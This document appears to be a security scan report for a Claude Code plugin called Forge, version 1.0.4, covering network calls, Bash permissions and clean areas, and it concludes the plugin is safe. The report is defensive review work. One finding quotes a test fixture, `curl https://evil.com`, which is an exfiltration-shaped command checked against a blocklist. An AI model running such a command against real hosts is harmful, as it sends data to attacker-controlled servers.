## Security Scan — forge:forge — 2026-05-30

**SHA**: c64d3dc (source-path scan of working tree) | **Installed**: n/a (source scan) | **Last updated**: 2026-05-30
**Scope**: project source — `--source-path forge/` | **Install path**: `forge/forge/` (370 tracked files)

### Summary
370 files scanned | 0 critical | 2 warnings | 1 info

Scan target is the v1.0.4 plugin source (`forge/forge/`) at commit `c64d3dc`. The
release diff over v1.0.3 touches only `tools/preflight-gate.cjs`,
`tools/lib/store-nlp.cjs`, `tools/lib/store-query-exec.cjs`, their tests, and the
version/migration/integrity/CHANGELOG metadata — pure store-query and path-resolution
logic with **no new network, credential, filesystem-escape, or process-exec surface**.

### Findings

#### WARNING hooks/check-update.cjs:65
- **Check**: A — outbound network call (known domain)
- **Issue**: `SessionStart` hook performs an HTTPS GET to fetch the remote plugin
  version. Destination is hard-allowlisted to `raw.githubusercontent.com`
  (`hooks/lib/update-url.cjs` `ALLOWED_DOMAINS`); any non-matching `updateUrl`
  falls back to the official `Entelligentsia/forge` `plugin.json`. GET-only, no
  request body, 2 s timeout; response is parsed for a version string and written
  only to local cache files. No data egress.
- **Excerpt**: `https.get(remoteUrl, { timeout: 2000 }, (res) => {`
- **Recommendation**: Safe to ignore — this is the standard, allowlist-gated
  version-check pattern cleared in every prior scan (v1.0.0 and earlier).

#### WARNING commands/status.md:4, commands/search.md:4
- **Check**: C — `allowed-tools: [Bash]` without an inline command-pattern restriction
- **Issue**: Both commands declare unrestricted `Bash`. Claude Code command
  frontmatter cannot pattern-restrict Bash the way `settings.json` can; the command
  bodies only locate the plugin root and invoke `node tools/store-cli.cjs` /
  `store-query` to read the local JSON store. No network, credential, or destructive
  operations in either body.
- **Excerpt**: `allowed-tools:\n  - Bash`
- **Recommendation**: Safe to ignore — established Forge command pattern, consistent
  with all prior SAFE verdicts. Store reads legitimately require shell to spawn the
  Node CLI.

#### INFO tools/__tests__/forge-permissions.test.cjs:32
- **Check**: A — apparent network call in source
- **Issue**: `curl https://evil.com` appears as a **test fixture** asserting that the
  `forge-permissions` blocklist correctly denies an exfiltration-shaped Bash command.
  Defensive, not executed at runtime.
- **Excerpt**: `const result = matchTool('Bash', { command: 'curl https://evil.com' });`
- **Recommendation**: Safe to ignore — negative test case for the permission gate.

### Clean Areas
- `hooks/` (hooks.json, validate-write, triage-error, post-init, post-sprint, forge-permissions) — all hooks invoke `node "${CLAUDE_PLUGIN_ROOT}/..."` with argv arrays; no shell string interpolation, timeouts ≤ 10 s
- `tools/*.cjs` (139 files) — `child_process` use is `spawnSync`/`execFileSync`/`execFileSync` with fixed `node` binary + argv arrays (no shell, no injection); no `eval`, no credential-path reads, no secret env capture, no obfuscation
- `tools/banners.sh` — benign wrapper sourcing `banners.cjs` via quoted `node` invocations
- 199 `*.md` workflow/persona/skill/command files — no prompt-injection phrases, no persona-hijack/safety-bypass strings, no zero-width/invisible Unicode, no base64 payloads, no hidden post-document instructions
- No binaries, compiled artifacts, or misleading file extensions anywhere in the tree

### Verdict

**SAFE TO USE**

Zero critical findings. The two warnings (allowlisted version-check egress; unrestricted
`Bash` in two store-read commands) are long-standing, justified design patterns cleared
in every prior release scan; the lone info item is a defensive test fixture. The v1.0.4
delta is pure store-query/path-resolution logic and adds no new sensitive surface.
